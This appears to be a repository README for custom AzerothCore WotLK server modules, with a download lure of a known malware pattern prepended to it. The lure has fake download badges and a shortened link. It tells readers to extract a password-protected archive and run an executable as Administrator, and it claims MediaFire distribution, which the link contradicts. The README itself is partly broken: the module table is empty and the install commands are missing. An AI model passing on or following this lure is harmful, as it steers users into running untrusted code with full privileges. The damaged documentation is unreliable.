<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://linkolla.com/2474b9">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# AzerothCore Custom Modules

Custom AzerothCore WotLK modules for quest drop rates, group speed, offline respawn handling, mana regeneration, welcome rewards, lockpicking for priests, Playerbot inventory management and Playerbot-oriented gameplay tweaks.

Each folder in this repository is a self-contained AzerothCore module for World of
Warcraft 3.3.5a (Wrath of the Lich King). The modules use only script hooks, so the
core stays unpatched, and every module can be installed on its own.

## Modules

| Module | Purpose |
|---|---|
### mod-quest-drop-rate

AzerothCore quest item drop rate module. Raises the drop chance of quest loot
(`QuestRequired = 1`) by a configurable multiplier, capped at 100 %, for every
loot type including fishing, pickpocketing and skinning. Quest items inside
referenced loot tables are raised as well; grouped loot is only touched when the
group consists of quest items alone, so normal items in a shared group keep their
chance. Normal loot and all `Rate.Drop.Item.*` settings stay unchanged.

### mod-offline-respawn-freeze

Freezes creature respawn timers while the server is offline. A creature that had
seven minutes left when the server stopped still has seven minutes left when it
starts again. Optionally the timers also pause while the server runs but no human
player is online, which suits small servers with Playerbots running around the
clock.

### mod-group-speed

Group movement speed command: `.group speed <rate>` sets walk, run, swim and
flight speed for every online member of your party or raid, Playerbots included,
with the same rules as `.modify speed all`. The module also makes ghosts run three
times as fast as normal.

### mod-welcome-promos

Configurable welcome mail with promotional rewards. Every newly created character
receives the configured items once, by mail. Existing characters and Playerbot
accounts are skipped.

### mod-out-of-combat-mana

Configurable out-of-combat mana regeneration. Multiplies the mana regeneration the
core already grants while a player is out of combat, keeps the five-second rule
intact and supports Players and Playerbots: bots in a group or raid with a real
player benefit, free-roaming random bots stay at normal regeneration.

### mod-bot-quest-item-cleanup

Playerbot quest item cleanup. When a bot is rewarded for a quest, the item that
quest handed out on accept (empty phials, sampling tubes, clue notes) is removed
from its bags. Bots that finish quests without playing them, for example with
`Playerbots.SyncQuestWithPlayer`, otherwise keep these unsellable items forever.
Real players are never touched.

### mod-bot-quest-abandon

Playerbot quest abandon. When you abandon a quest, the bots in your party or raid
on the same map abandon it as well, through the same core handler a client uses.
Bots that took the quest over with `Playerbots.SyncQuestWithPlayer` otherwise keep
it in their logs. One system message names the bots that followed.

### mod-priest-lockpicking

Lockpicking for priests. Every priest that is not a random bot knows Pick Lock and
has the Lockpicking skill at 450/450. The core removes a class-foreign skill, its
spell and the action bar button on every login; the module grants them again
through login hooks instead of storing them, so `ValidateSkillLearnedBySpells = 1`
stays on and neither DBC nor database changes are needed.

### mod-bot-inventory

Playerbot inventory management without trade windows. `.botinv` lists the bags,
equipment and money of you and the bots in your party or raid, moves items and gold
directly between them and applies profession enchants to any of their items. The
output is line based and reaches a client addon through AzerothCore's addon command
channel, so an addon can show every inventory in one window.

## Compatibility

- AzerothCore WotLK (3.3.5a). Developed and run on the
## Installation

AzerothCore expects every module as a direct subfolder of `modules/`. Do not clone
this repository itself into `modules/`; link or copy the modules you want instead.

```bash
# repeat for every module you want, or use cp -r instead of ln -s
```

Then re-run CMake (the module list is fixed at configure time), build and install
as usual:

```bash
cmake -S azerothcore-wotlk -B build
cmake --build build
cmake --install build
```

The install step places each `*.conf.dist` in `etc/modules/`. Copy it to the same
name without `.dist` to change settings. SQL files under `data/sql/` are applied
automatically by the AzerothCore database updater on the next start.

## Tests

Modules with pure calculation logic ship a standalone test that needs neither a
server nor the core sources:

```bash
mod-quest-drop-rate/tests/run_logic_test.sh
mod-out-of-combat-mana/tests/run_logic_test.sh
```

## Support

If these modules help you and you want to support their development:


---

MIT License

Copyright (c) 2026 quasistatic-setup

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
